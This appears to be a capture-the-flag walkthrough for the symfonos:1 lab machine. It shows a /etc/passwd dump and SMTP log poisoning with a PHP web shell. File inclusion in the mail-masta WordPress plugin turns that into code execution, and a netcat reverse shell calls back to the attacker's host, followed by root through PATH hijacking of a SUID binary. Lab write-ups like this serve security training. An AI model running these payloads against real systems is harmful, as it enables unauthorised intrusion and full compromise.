uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
Debian-exim:x:105:109::/var/spool/exim4:/bin/false
messagebus:x:106:111::/var/run/dbus:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
helios:x:1000:1000:,,,:/home/helios:/bin/bash
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:109:115::/var/spool/postfix:/bin/false

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


LFI to RCE
Local File Inclusion to Remote Code Execution
Sending a email and then receiveing the file

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:/mnt# telnet 192.168.56.106 25
Trying 192.168.56.106...
Connected to 192.168.56.106.
Escape character is '^]'.
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
mail from: <setrus>
250 2.1.0 Ok
RCPT TO: helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
<?php system($_GET['c']); ?>
.
250 2.0.0 Ok: queued as 068DD406A1

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Remote Code execution

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id;hostname
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Getting Reverse Shell:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=nc%20192.168.56.101%208080%20-e%20/bin/sh
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


In Kali

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
root@setrus:~/vulnhub/symfonos1# nc -nvlp 8080
listening on [any] 8080 ...
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.106] 55568
id
uid=1000(helios) gid=1000(helios) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
python -c 'import pty;pty.spawn("/bin/bash");'
<h3l105/wp-content/plugins/mail-masta/inc/campaign$ cd ?
cd ?
bash: cd: ?: No such file or directory
<h3l105/wp-content/plugins/mail-masta/inc/campaign$ cd ~
cd ~
helios@symfonos:/home/helios$ 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Privilege Escalation

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
helios@symfonos:/home/helios$ strings /opt/statuscheck
strings /opt/statuscheck
/lib64/ld-linux-x86-64.so.2
libc.so.6
system
__cxa_finalize
__libc_start_main
_ITM_deregisterTMCloneTable
__gmon_start__
_Jv_RegisterClasses
_ITM_registerTMCloneTable
GLIBC_2.2.5
curl -I H
http://lH
ocalhostH
AWAVA
AUATL
[]A\A]A^A_
;*3$"
GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.6972
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
prog.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMClo
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Creating a curl in tmp and running /opt/statuscheck

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
helios@symfonos:/home/helios$ echo '/bin/sh' > /tmp/curl; chmod 777 /tmp/curl; export PATH=/tmp:$PATH; /opt/statuscheck
</tmp/curl; export PATH=/tmp:$PATH; /opt/statuscheck
# id
id
uid=1000(helios) gid=1000(helios) euid=0(root) groups=1000(helios),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Getting the flag


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
cd /root
# cat flag.txt
cat flag.txt
cat: flag.txt: No such file or directory
# ls
ls
proof.txt
# cat proof.txt
cat proof.txt

	Congrats on rooting symfonos:1!

                 \ __
--==/////////////[})))==*
                 / \ '          ,|
                    `\`\      //|                             ,|
                      \ `\  //,/'                           -~ |
   )             _-~~~\  |/ / |'|                       _-~  / ,
  ((            /' )   | \ / /'/                    _-~   _/_-~|
 (((            ;  /`  ' )/ /''                 _ -~     _-~ ,/'
 ) ))           `~~\   `\\/'/|'           __--~~__--\ _-~  _/, 
((( ))            / ~~    \ /~      __--~~  --~~  __/~  _-~ /
 ((\~\           |    )   | '      /        __--~~  \-~~ _-~
    `\(\    __--(   _/    |'\     /     --~~   __--~' _-~ ~|
     (  ((~~   __-~        \~\   /     ___---~~  ~~\~~__--~ 
      ~~\~~~~~~   `\-~      \~\ /           __--~~~'~~/
                   ;\ __.-~  ~-/      ~~~~~__\__---~~ _..--._
                   ;;;;;;;;'  /      ---~~~/_.-----.-~  _.._ ~\     
                  ;;;;;;;'   /      ----~~/         `\,~    `\ \        
                  ;;;;'     (      ---~~/         `:::|       `\\.      
                  |'  _      `----~~~~'      /      `:|        ()))),      
            ______/\/~    |                 /        /         (((((())  
          /~;;.____/;;'  /          ___.---(   `;;;/             )))'`))
         / //  _;______;'------~~~~~    |;;/\    /                ((   ( 
        //  \ \                        /  |  \;;,\                 `   
       (<_    \ \                    /',/-----'  _> 
        \_|     \\_                 //~;~~~~~~~~~ 
                 \_|               (,~~   
                                    \~\
                                     ~~

	Contact me via Twitter @zayotic to give feedback!


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



